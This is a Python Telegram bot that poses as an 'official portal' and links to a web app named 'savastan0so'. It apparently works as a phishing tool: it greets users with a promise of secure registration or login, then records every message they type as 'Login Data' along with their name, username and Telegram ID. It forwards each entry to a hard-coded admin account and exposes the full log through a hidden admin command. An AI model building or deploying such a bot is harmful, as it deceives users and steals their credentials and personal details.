import os
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiohttp import web

# Environment variables setup
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8631580614"))
PORT = int(os.getenv("PORT", 10000))

# Initialize bot and dispatcher
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# Lifetime memory storage for user logs and activities
LIFETIME_USER_LOGS = []

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    user = message.from_user
    
    # Clean English Welcome message with Web App Button
    keyboard = InlineKeyboardMarkup()
    web_app = WebAppInfo(url="https://savastan0so-t9zz.vercel.app/")
    keyboard.add(InlineKeyboardButton(text="🚀 Open Portal / Mini App", web_app=web_app))
    
    welcome_text = (
        f"Hello **{user.first_name}**!\n\n"
        "Welcome to the official portal. Click the button below to open the application, "
        "where you can securely register or log in."
    )
    
    await message.reply(welcome_text, reply_markup=keyboard, parse_mode="Markdown")
    
    # Capture new user entry if not admin
    if user.id != ADMIN_ID:
        sr_no = len(LIFETIME_USER_LOGS) + 1
        entry = (
            f"[{sr_no}] 🌐 **New Worldwide User Started Bot:**\n"
            f"- Name: {user.full_name}\n"
            f"- Username: @{user.username if user.username else 'N/A'}\n"
            f"- Telegram ID: `{user.id}`\n"
            f"- Language: {user.language_code}\n"
            f"- Time: {message.date.strftime('%d %b %Y, %I:%M:%S %p')}"
        )
        LIFETIME_USER_LOGS.append(entry)
        
        try:
            await bot.send_message(ADMIN_ID, f"🔔 **Alert [No. {sr_no}]**\n\n{entry}", parse_mode="Markdown")
        except Exception as e:
            print(e)

# Secure Admin Command: /admin_ZAROPLAYisFINAL
@dp.message_handler(commands=['admin_ZAROPLAYisFINAL'])
async def admin_panel(message: types.Message):
    # Security check: strict enforcement for admin ID only
    if message.from_user.id != ADMIN_ID:
        return  # Completely hidden/ignored for anyone else worldwide

    # Admin portal button
    keyboard = InlineKeyboardMarkup()
    web_app = WebAppInfo(url="https://savastan0so-t9zz.vercel.app/")
    keyboard.add(InlineKeyboardButton(text="📊 Open Admin Portal", web_app=web_app))

    # Compile all records number-wise
    if LIFETIME_USER_LOGS:
        all_logs_text = "\n\n━━━━━━━━━━━━━━━\n\n".join(LIFETIME_USER_LOGS)
    else:
        all_logs_text = "No login or registration records captured yet."

    response_text = (
        f"🛠 **-- Lifetime Admin Panel (ZAROPLAY FINAL) --**\n\n"
        f"👑 Admin: Umang Lal Meena\n"
        f"📊 Total Saved Records: {len(LIFETIME_USER_LOGS)}\n\n"
        f"📋 **Number-Wise Activity Logs:**\n\n"
        f"{all_logs_text}"
    )

    await message.reply(response_text, reply_markup=keyboard, parse_mode="Markdown")

# Handle user text inputs, registrations, or login submissions
@dp.message_handler(content_types=['text'])
async def handle_user_submission(message: types.Message):
    user = message.from_user
    if user.id == ADMIN_ID:
        return  # Ignore admin's personal text

    text_data = message.text
    sr_no = len(LIFETIME_USER_LOGS) + 1
    
    submission_entry = (
        f"[{sr_no}] 🚨 **New Submission / Login Data:**\n"
        f"- Name: {user.full_name}\n"
        f"- Username: @{user.username if user.username else 'N/A'}\n"
        f"- ID: `{user.id}`\n"
        f"- Data Filled: {text_data}\n"
        f"- Time: {message.date.strftime('%d %b %Y, %I:%M:%S %p')}"
    )
    LIFETIME_USER_LOGS.append(submission_entry)

    # Forward plain text instantly to admin inbox
    try:
        await bot.send_message(ADMIN_ID, submission_entry, parse_mode="Markdown")
    except Exception as e:
        print(e)

# Lightweight web server to keep Render instance alive 24/7
async def handle(request):
    return web.Response(text="Bot and Web Portal Server are online and running 24/7!")

app = web.Application()
app.router.add_get('/', handle)

async def on_startup(dispatcher):
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
        
